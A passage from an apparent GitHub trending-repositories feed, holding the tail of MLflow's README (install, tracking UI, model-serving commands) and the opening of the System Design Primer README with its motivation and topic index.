href=&#34;https://img.shields.io/github/workflow/status/mlflow/mlflow/Labeling?label=Labeling&amp;amp;style=for-the-badge&amp;amp;logo=github&#34;&gt;https://img.shields.io/github/workflow/status/mlflow/mlflow/Labeling?label=Labeling&amp;amp;style=for-the-badge&amp;amp;logo=github&lt;/a&gt; :target: &lt;a href=&#34;https://github.com/mlflow/mlflow/actions?query=workflow%3ALabeling&#34;&gt;https://github.com/mlflow/mlflow/actions?query=workflow%3ALabeling&lt;/a&gt; :alt: Labeling Action Status .. |examples| image:: &lt;a href=&#34;https://img.shields.io/github/workflow/status/mlflow/mlflow/Examples?event=schedule&amp;amp;label=Examples&amp;amp;style=for-the-badge&amp;amp;logo=github&#34;&gt;https://img.shields.io/github/workflow/status/mlflow/mlflow/Examples?event=schedule&amp;amp;label=Examples&amp;amp;style=for-the-badge&amp;amp;logo=github&lt;/a&gt; :target: &lt;a href=&#34;https://github.com/mlflow/mlflow/actions?query=workflow%3AExamples+event%3Aschedule&#34;&gt;https://github.com/mlflow/mlflow/actions?query=workflow%3AExamples+event%3Aschedule&lt;/a&gt; :alt: Examples Action Status .. |cross-version-tests| image:: &lt;a href=&#34;https://img.shields.io/github/workflow/status/mlflow/mlflow/Cross%20version%20tests?event=schedule&amp;amp;label=Cross%20version%20tests&amp;amp;style=for-the-badge&amp;amp;logo=github&#34;&gt;https://img.shields.io/github/workflow/status/mlflow/mlflow/Cross%20version%20tests?event=schedule&amp;amp;label=Cross%20version%20tests&amp;amp;style=for-the-badge&amp;amp;logo=github&lt;/a&gt; :target: &lt;a href=&#34;https://github.com/mlflow/mlflow/actions?query=workflow%3ACross%2Bversion%2Btests+event%3Aschedule&#34;&gt;https://github.com/mlflow/mlflow/actions?query=workflow%3ACross%2Bversion%2Btests+event%3Aschedule&lt;/a&gt; .. |r-devel| image:: &lt;a href=&#34;https://img.shields.io/github/workflow/status/mlflow/mlflow/R?event=schedule&amp;amp;label=r-devel&amp;amp;style=for-the-badge&amp;amp;logo=github&#34;&gt;https://img.shields.io/github/workflow/status/mlflow/mlflow/R?event=schedule&amp;amp;label=r-devel&amp;amp;style=for-the-badge&amp;amp;logo=github&lt;/a&gt; :target: &lt;a href=&#34;https://github.com/mlflow/mlflow/actions?query=workflow%3AR+event%3Aschedule&#34;&gt;https://github.com/mlflow/mlflow/actions?query=workflow%3AR+event%3Aschedule&lt;/a&gt; :alt: Examples Action Status .. |pypi| image:: &lt;a href=&#34;https://img.shields.io/pypi/v/mlflow.svg?style=for-the-badge&amp;amp;logo=pypi&amp;amp;logoColor=white&#34;&gt;https://img.shields.io/pypi/v/mlflow.svg?style=for-the-badge&amp;amp;logo=pypi&amp;amp;logoColor=white&lt;/a&gt; :target: &lt;a href=&#34;https://pypi.org/project/mlflow/&#34;&gt;https://pypi.org/project/mlflow/&lt;/a&gt; :alt: Latest Python Release .. |conda-forge| image:: &lt;a href=&#34;https://img.shields.io/conda/vn/conda-forge/mlflow.svg?style=for-the-badge&amp;amp;logo=anaconda&#34;&gt;https://img.shields.io/conda/vn/conda-forge/mlflow.svg?style=for-the-badge&amp;amp;logo=anaconda&lt;/a&gt; :target: &lt;a href=&#34;https://anaconda.org/conda-forge/mlflow&#34;&gt;https://anaconda.org/conda-forge/mlflow&lt;/a&gt; :alt: Latest Conda Release .. |cran| image:: &lt;a href=&#34;https://img.shields.io/cran/v/mlflow.svg?style=for-the-badge&amp;amp;logo=r&#34;&gt;https://img.shields.io/cran/v/mlflow.svg?style=for-the-badge&amp;amp;logo=r&lt;/a&gt; :target: &lt;a href=&#34;https://cran.r-project.org/package=mlflow&#34;&gt;https://cran.r-project.org/package=mlflow&lt;/a&gt; :alt: Latest CRAN Release .. |maven| image:: &lt;a href=&#34;https://img.shields.io/maven-central/v/org.mlflow/mlflow-parent.svg?style=for-the-badge&amp;amp;logo=apache-maven&#34;&gt;https://img.shields.io/maven-central/v/org.mlflow/mlflow-parent.svg?style=for-the-badge&amp;amp;logo=apache-maven&lt;/a&gt; :target: &lt;a href=&#34;https://mvnrepository.com/artifact/org.mlflow&#34;&gt;https://mvnrepository.com/artifact/org.mlflow&lt;/a&gt; :alt: Maven Central .. |license| image:: &lt;a href=&#34;https://img.shields.io/badge/license-Apache%202-brightgreen.svg?style=for-the-badge&amp;amp;logo=apache&#34;&gt;https://img.shields.io/badge/license-Apache%202-brightgreen.svg?style=for-the-badge&amp;amp;logo=apache&lt;/a&gt; :target: &lt;a href=&#34;https://github.com/mlflow/mlflow/raw/master/LICENSE.txt&#34;&gt;https://github.com/mlflow/mlflow/blob/master/LICENSE.txt&lt;/a&gt; :alt: Apache 2 License .. |downloads| image:: &lt;a href=&#34;https://img.shields.io/pypi/dw/mlflow?style=for-the-badge&amp;amp;logo=pypi&amp;amp;logoColor=white&#34;&gt;https://img.shields.io/pypi/dw/mlflow?style=for-the-badge&amp;amp;logo=pypi&amp;amp;logoColor=white&lt;/a&gt; :target: &lt;a href=&#34;https://pepy.tech/project/mlflow&#34;&gt;https://pepy.tech/project/mlflow&lt;/a&gt; :alt: Total Downloads .. |slack| image:: &lt;a href=&#34;https://img.shields.io/badge/slack-@mlflow--users-CF0E5B.svg?logo=slack&amp;amp;logoColor=white&amp;amp;labelColor=3F0E40&amp;amp;style=for-the-badge&#34;&gt;https://img.shields.io/badge/slack-@mlflow--users-CF0E5B.svg?logo=slack&amp;amp;logoColor=white&amp;amp;labelColor=3F0E40&amp;amp;style=for-the-badge&lt;/a&gt; :target: &lt;code&gt;Slack&lt;/code&gt;_ :alt: Slack .. |twitter| image:: &lt;a href=&#34;https://img.shields.io/twitter/follow/MLflow?style=for-the-badge&amp;amp;labelColor=00ACEE&amp;amp;logo=twitter&amp;amp;logoColor=white&#34;&gt;https://img.shields.io/twitter/follow/MLflow?style=for-the-badge&amp;amp;labelColor=00ACEE&amp;amp;logo=twitter&amp;amp;logoColor=white&lt;/a&gt; :target: &lt;a href=&#34;https://twitter.com/MLflow&#34;&gt;https://twitter.com/MLflow&lt;/a&gt; :alt: Account Twitter&lt;/p&gt; &#xA;&lt;p&gt;.. _Slack: &lt;a href=&#34;https://join.slack.com/t/mlflow-users/shared_invite/zt-g6qwro5u-odM7pRnZxNX_w56mcsHp8g&#34;&gt;https://join.slack.com/t/mlflow-users/shared_invite/zt-g6qwro5u-odM7pRnZxNX_w56mcsHp8g&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Installing&lt;/h2&gt; &#xA;&lt;p&gt;Install MLflow from PyPI via &lt;code&gt;pip install mlflow&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;MLflow requires &lt;code&gt;conda&lt;/code&gt; to be on the &lt;code&gt;PATH&lt;/code&gt; for the projects feature.&lt;/p&gt; &#xA;&lt;p&gt;Nightly snapshots of MLflow master are also available &lt;code&gt;here &amp;lt;https://mlflow-snapshots.s3-us-west-2.amazonaws.com/&amp;gt;&lt;/code&gt;_.&lt;/p&gt; &#xA;&lt;p&gt;Install a lower dependency subset of MLflow from PyPI via &lt;code&gt;pip install mlflow-skinny&lt;/code&gt; Extra dependencies can be added per desired scenario. For example, &lt;code&gt;pip install mlflow-skinny pandas numpy&lt;/code&gt; allows for mlflow.pyfunc.log_model support.&lt;/p&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;Official documentation for MLflow can be found at &lt;a href=&#34;https://mlflow.org/docs/latest/index.html&#34;&gt;https://mlflow.org/docs/latest/index.html&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Roadmap&lt;/h2&gt; &#xA;&lt;p&gt;The current MLflow Roadmap is available at &lt;a href=&#34;https://github.com/mlflow/mlflow/milestone/3&#34;&gt;https://github.com/mlflow/mlflow/milestone/3&lt;/a&gt;. We are seeking contributions to all of our roadmap items with the &lt;code&gt;help wanted&lt;/code&gt; label. Please see the &lt;code&gt;Contributing&lt;/code&gt;_ section for more information.&lt;/p&gt; &#xA;&lt;h2&gt;Community&lt;/h2&gt; &#xA;&lt;p&gt;For help or questions about MLflow usage (e.g. &#34;how do I do X?&#34;) see the &lt;code&gt;docs &amp;lt;https://mlflow.org/docs/latest/index.html&amp;gt;&lt;/code&gt;_ or &lt;code&gt;Stack Overflow &amp;lt;https://stackoverflow.com/questions/tagged/mlflow&amp;gt;&lt;/code&gt;_.&lt;/p&gt; &#xA;&lt;p&gt;To report a bug, file a documentation issue, or submit a feature request, please open a GitHub issue.&lt;/p&gt; &#xA;&lt;p&gt;For release announcements and other discussions, please subscribe to our mailing list (&lt;a href=&#34;mailto:mlflow-users@googlegroups.com&#34;&gt;mlflow-users@googlegroups.com&lt;/a&gt;) or join us on &lt;code&gt;Slack&lt;/code&gt;_.&lt;/p&gt; &#xA;&lt;h2&gt;Running a Sample App With the Tracking API&lt;/h2&gt; &#xA;&lt;p&gt;The programs in &lt;code&gt;examples&lt;/code&gt; use the MLflow Tracking API. For instance, run::&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python examples/quickstart/mlflow_tracking.py&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This program will use &lt;code&gt;MLflow Tracking API &amp;lt;https://mlflow.org/docs/latest/tracking.html&amp;gt;&lt;/code&gt;_, which logs tracking data in &lt;code&gt;./mlruns&lt;/code&gt;. This can then be viewed with the Tracking UI.&lt;/p&gt; &#xA;&lt;h2&gt;Launching the Tracking UI&lt;/h2&gt; &#xA;&lt;p&gt;The MLflow Tracking UI will show runs logged in &lt;code&gt;./mlruns&lt;/code&gt; at &lt;code&gt;&amp;lt;http://localhost:5000&amp;gt;&lt;/code&gt;_. Start it with::&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;mlflow ui&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Running &lt;code&gt;mlflow ui&lt;/code&gt; from within a clone of MLflow is not recommended - doing so will run the dev UI from source. We recommend running the UI from a different working directory, specifying a backend store via the &lt;code&gt;--backend-store-uri&lt;/code&gt; option. Alternatively, see instructions for running the dev UI in the &lt;code&gt;contributor guide &amp;lt;CONTRIBUTING.rst&amp;gt;&lt;/code&gt;_.&lt;/p&gt; &#xA;&lt;h2&gt;Running a Project from a URI&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;code&gt;mlflow run&lt;/code&gt; command lets you run a project packaged with a MLproject file from a local path or a Git URI::&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;mlflow run examples/sklearn_elasticnet_wine -P alpha=0.4&#xA;&#xA;mlflow run https://github.com/mlflow/mlflow-example.git -P alpha=0.4&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;See &lt;code&gt;examples/sklearn_elasticnet_wine&lt;/code&gt; for a sample project with an MLproject file.&lt;/p&gt; &#xA;&lt;h2&gt;Saving and Serving Models&lt;/h2&gt; &#xA;&lt;p&gt;To illustrate managing models, the &lt;code&gt;mlflow.sklearn&lt;/code&gt; package can log scikit-learn models as MLflow artifacts and then load them again for serving. There is an example training application in &lt;code&gt;examples/sklearn_logistic_regression/train.py&lt;/code&gt; that you can run as follows::&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ python examples/sklearn_logistic_regression/train.py&#xA;Score: 0.666&#xA;Model saved in run &amp;lt;run-id&amp;gt;&#xA;&#xA;$ mlflow models serve --model-uri runs:/&amp;lt;run-id&amp;gt;/model&#xA;&#xA;$ curl -d &#39;{&#34;columns&#34;:[0],&#34;index&#34;:[0,1],&#34;data&#34;:[[1],[-1]]}&#39; -H &#39;Content-Type: application/json&#39;  localhost:5000/invocations&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;We happily welcome contributions to MLflow. We are also seeking contributions to items on the &lt;code&gt;MLflow Roadmap &amp;lt;https://github.com/mlflow/mlflow/milestone/3&amp;gt;&lt;/code&gt;&lt;em&gt;. Please see our &lt;code&gt;contribution guide &amp;lt;CONTRIBUTING.rst&amp;gt;&lt;/code&gt;&lt;/em&gt; to learn more about contributing to MLflow.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>donnemartin/system-design-primer</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/donnemartin/system-design-primer</id>
    <link href="https://github.com/donnemartin/system-design-primer" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Learn how to design large-scale systems. Prep for the system design interview. Includes Anki flashcards.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;em&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/README.md&#34;&gt;English&lt;/a&gt; ∙ &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/README-ja.md&#34;&gt;日本語&lt;/a&gt; ∙ &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/README-zh-Hans.md&#34;&gt;简体中文&lt;/a&gt; ∙ &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/README-zh-TW.md&#34;&gt;繁體中文&lt;/a&gt; | &lt;a href=&#34;https://github.com/donnemartin/system-design-primer/issues/170&#34;&gt;العَرَبِيَّة‎&lt;/a&gt; ∙ &lt;a href=&#34;https://github.com/donnemartin/system-design-primer/issues/220&#34;&gt;বাংলা&lt;/a&gt; ∙ &lt;a href=&#34;https://github.com/donnemartin/system-design-primer/issues/40&#34;&gt;Português do Brasil&lt;/a&gt; ∙ &lt;a href=&#34;https://github.com/donnemartin/system-design-primer/issues/186&#34;&gt;Deutsch&lt;/a&gt; ∙ &lt;a href=&#34;https://github.com/donnemartin/system-design-primer/issues/130&#34;&gt;ελληνικά&lt;/a&gt; ∙ &lt;a href=&#34;https://github.com/donnemartin/system-design-primer/issues/272&#34;&gt;עברית&lt;/a&gt; ∙ &lt;a href=&#34;https://github.com/donnemartin/system-design-primer/issues/104&#34;&gt;Italiano&lt;/a&gt; ∙ &lt;a href=&#34;https://github.com/donnemartin/system-design-primer/issues/102&#34;&gt;한국어&lt;/a&gt; ∙ &lt;a href=&#34;https://github.com/donnemartin/system-design-primer/issues/110&#34;&gt;فارسی&lt;/a&gt; ∙ &lt;a href=&#34;https://github.com/donnemartin/system-design-primer/issues/68&#34;&gt;Polski&lt;/a&gt; ∙ &lt;a href=&#34;https://github.com/donnemartin/system-design-primer/issues/87&#34;&gt;русский язык&lt;/a&gt; ∙ &lt;a href=&#34;https://github.com/donnemartin/system-design-primer/issues/136&#34;&gt;Español&lt;/a&gt; ∙ &lt;a href=&#34;https://github.com/donnemartin/system-design-primer/issues/187&#34;&gt;ภาษาไทย&lt;/a&gt; ∙ &lt;a href=&#34;https://github.com/donnemartin/system-design-primer/issues/39&#34;&gt;Türkçe&lt;/a&gt; ∙ &lt;a href=&#34;https://github.com/donnemartin/system-design-primer/issues/127&#34;&gt;tiếng Việt&lt;/a&gt; ∙ &lt;a href=&#34;https://github.com/donnemartin/system-design-primer/issues/250&#34;&gt;Français&lt;/a&gt; | &lt;a href=&#34;https://github.com/donnemartin/system-design-primer/issues/28&#34;&gt;Add Translation&lt;/a&gt;&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Help &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/TRANSLATIONS.md&#34;&gt;translate&lt;/a&gt; this guide!&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h1&gt;The System Design Primer&lt;/h1&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/jj3A5N8.png&#34;&gt; &lt;br&gt; &lt;/p&gt; &#xA;&lt;h2&gt;Motivation&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Learn how to design large-scale systems.&lt;/p&gt; &#xA; &lt;p&gt;Prep for the system design interview.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;Learn how to design large-scale systems&lt;/h3&gt; &#xA;&lt;p&gt;Learning how to design scalable systems will help you become a better engineer.&lt;/p&gt; &#xA;&lt;p&gt;System design is a broad topic. There is a &lt;strong&gt;vast amount of resources scattered throughout the web&lt;/strong&gt; on system design principles.&lt;/p&gt; &#xA;&lt;p&gt;This repo is an &lt;strong&gt;organized collection&lt;/strong&gt; of resources to help you learn how to build systems at scale.&lt;/p&gt; &#xA;&lt;h3&gt;Learn from the open source community&lt;/h3&gt; &#xA;&lt;p&gt;This is a continually updated, open source project.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#contributing&#34;&gt;Contributions&lt;/a&gt; are welcome!&lt;/p&gt; &#xA;&lt;h3&gt;Prep for the system design interview&lt;/h3&gt; &#xA;&lt;p&gt;In addition to coding interviews, system design is a &lt;strong&gt;required component&lt;/strong&gt; of the &lt;strong&gt;technical interview process&lt;/strong&gt; at many tech companies.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Practice common system design interview questions&lt;/strong&gt; and &lt;strong&gt;compare&lt;/strong&gt; your results with &lt;strong&gt;sample solutions&lt;/strong&gt;: discussions, code, and diagrams.&lt;/p&gt; &#xA;&lt;p&gt;Additional topics for interview prep:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#study-guide&#34;&gt;Study guide&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#how-to-approach-a-system-design-interview-question&#34;&gt;How to approach a system design interview question&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#system-design-interview-questions-with-solutions&#34;&gt;System design interview questions, &lt;strong&gt;with solutions&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#object-oriented-design-interview-questions-with-solutions&#34;&gt;Object-oriented design interview questions, &lt;strong&gt;with solutions&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#additional-system-design-interview-questions&#34;&gt;Additional system design interview questions&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Anki flashcards&lt;/h2&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/zdCAkB3.png&#34;&gt; &lt;br&gt; &lt;/p&gt; &#xA;&lt;p&gt;The provided &lt;a href=&#34;https://apps.ankiweb.net/&#34;&gt;Anki flashcard decks&lt;/a&gt; use spaced repetition to help you retain key system design concepts.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/donnemartin/system-design-primer/tree/master/resources/flash_cards/System%20Design.apkg&#34;&gt;System design deck&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/donnemartin/system-design-primer/tree/master/resources/flash_cards/System%20Design%20Exercises.apkg&#34;&gt;System design exercises deck&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/donnemartin/system-design-primer/tree/master/resources/flash_cards/OO%20Design.apkg&#34;&gt;Object oriented design exercises deck&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Great for use while on-the-go.&lt;/p&gt; &#xA;&lt;h3&gt;Coding Resource: Interactive Coding Challenges&lt;/h3&gt; &#xA;&lt;p&gt;Looking for resources to help you prep for the &lt;a href=&#34;https://github.com/donnemartin/interactive-coding-challenges&#34;&gt;&lt;strong&gt;Coding Interview&lt;/strong&gt;&lt;/a&gt;?&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/b4YtAEN.png&#34;&gt; &lt;br&gt; &lt;/p&gt; &#xA;&lt;p&gt;Check out the sister repo &lt;a href=&#34;https://github.com/donnemartin/interactive-coding-challenges&#34;&gt;&lt;strong&gt;Interactive Coding Challenges&lt;/strong&gt;&lt;/a&gt;, which contains an additional Anki deck:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/donnemartin/interactive-coding-challenges/tree/master/anki_cards/Coding.apkg&#34;&gt;Coding deck&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Learn from the community.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Feel free to submit pull requests to help:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Fix errors&lt;/li&gt; &#xA; &lt;li&gt;Improve sections&lt;/li&gt; &#xA; &lt;li&gt;Add new sections&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/donnemartin/system-design-primer/issues/28&#34;&gt;Translate&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Content that needs some polishing is placed &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#under-development&#34;&gt;under development&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Review the &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/CONTRIBUTING.md&#34;&gt;Contributing Guidelines&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Index of system design topics&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Summaries of various system design topics, including pros and cons. &lt;strong&gt;Everything is a trade-off&lt;/strong&gt;.&lt;/p&gt; &#xA; &lt;p&gt;Each section contains links to more in-depth resources.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/jrUBAF7.png&#34;&gt; &lt;br&gt; &lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#system-design-topics-start-here&#34;&gt;System design topics: start here&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#step-1-review-the-scalability-video-lecture&#34;&gt;Step 1: Review the scalability video lecture&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#step-2-review-the-scalability-article&#34;&gt;Step 2: Review the scalability article&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#next-steps&#34;&gt;Next steps&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#performance-vs-scalability&#34;&gt;Performance vs scalability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#latency-vs-throughput&#34;&gt;Latency vs throughput&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#availability-vs-consistency&#34;&gt;Availability vs consistency&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#cap-theorem&#34;&gt;CAP theorem&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#cp---consistency-and-partition-tolerance&#34;&gt;CP - consistency and partition tolerance&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#ap---availability-and-partition-tolerance&#34;&gt;AP - availability and partition tolerance&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#consistency-patterns&#34;&gt;Consistency patterns&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#weak-consistency&#34;&gt;Weak consistency&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#eventual-consistency&#34;&gt;Eventual consistency&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#strong-consistency&#34;&gt;Strong consistency&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#availability-patterns&#34;&gt;Availability patterns&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#fail-over&#34;&gt;Fail-over&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#replication&#34;&gt;Replication&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#availability-in-numbers&#34;&gt;Availability in numbers&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#domain-name-system&#34;&gt;Domain name system&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#content-delivery-network&#34;&gt;Content delivery network&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#push-cdns&#34;&gt;Push CDNs&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#pull-cdns&#34;&gt;Pull CDNs&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#load-balancer&#34;&gt;Load balancer&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#active-passive&#34;&gt;Active-passive&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#active-active&#34;&gt;Active-active&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#layer-4-load-balancing&#34;&gt;Layer 4 load balancing&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#layer-7-load-balancing&#34;&gt;Layer 7 load balancing&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#horizontal-scaling&#34;&gt;Horizontal scaling&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#reverse-proxy-web-server&#34;&gt;Reverse proxy (web server)&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#load-balancer-vs-reverse-proxy&#34;&gt;Load balancer vs reverse proxy&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#application-layer&#34;&gt;Application layer&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#microservices&#34;&gt;Microservices&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#service-discovery&#34;&gt;Service discovery&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#database&#34;&gt;Database&lt;/a&gt; &#xA;  